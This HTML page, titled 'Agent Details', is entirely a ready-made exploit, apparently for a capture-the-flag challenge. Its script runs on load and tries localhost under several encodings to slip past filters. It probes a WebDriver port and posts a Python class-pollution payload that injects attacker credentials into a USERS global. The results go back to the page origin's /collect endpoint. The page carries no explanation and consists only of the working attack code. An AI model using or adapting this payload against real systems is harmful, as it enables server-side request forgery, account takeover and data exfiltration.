<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Agent Details</title>
</head>
<body>
<img src="/collect?ping=1" alt="" style="display:none;" />
<script>
(async () => {
  const payload = {
    machine_id: "host-1492",
    __class__: {
      __init__: {
        __globals__: {
          USERS: [
            {
              username: "lean@tornado-service.htb",
              password: "SuperSecurePass123!"
            }
          ]
        }
      }
    }
  };

  let status = "error";
  let body = "";
  let errorMsg = "";
  let debug = "";
  let extra = "";

  const targets = [
    "http://127.0.0.1:1337",
    "http://2130706433:1337",
    "http://0x7f000001:1337",
    "http://0177.0.0.1:1337",
    "http://localhost:1337",
    "http://[::1]:1337"
  ];

  for (const base of targets) {
    try {
      const resp = await fetch(`${base}/get_tornados`, {
        method: "GET",
        mode: "cors",
        cache: "no-store"
      });
      if (resp && resp.ok) {
        debug = await resp.text();
        break;
      }
    } catch (e) {
      debug = e && e.message ? e.message : `get_failed_${base}`;
    }
  }

  try {
    const resp = await fetch("http://127.0.0.1:9515/status", {
      method: "GET",
      mode: "cors",
      cache: "no-store"
    });
    if (resp && resp.ok) {
      extra = await resp.text();
    }
  } catch (e) {
    extra = e && e.message ? e.message : "wd_failed";
  }

  for (const base of targets) {
    try {
      await fetch(`${base}/update_tornado`, {
        method: "POST",
        body: JSON.stringify(payload),
        mode: "no-cors",
        credentials: "include",
        cache: "no-store"
      });
      status = `sent_${base}`;
      body = "opaque";
      break;
    } catch (e) {
      errorMsg = e && e.message ? e.message : `fetch_failed_${base}`;
    }
  }

  try {
    const info = `s=${status}&e=${encodeURIComponent(errorMsg)}&b=${encodeURIComponent(body.slice(0, 120))}&d=${encodeURIComponent(debug.slice(0, 120))}&x=${encodeURIComponent(extra.slice(0, 120))}`;
    await fetch(`${location.origin}/collect?${info}`);
  } catch (e) {}

  document.body.innerHTML = "<h1>Done</h1>";
})();
</script>
</body>
</html>
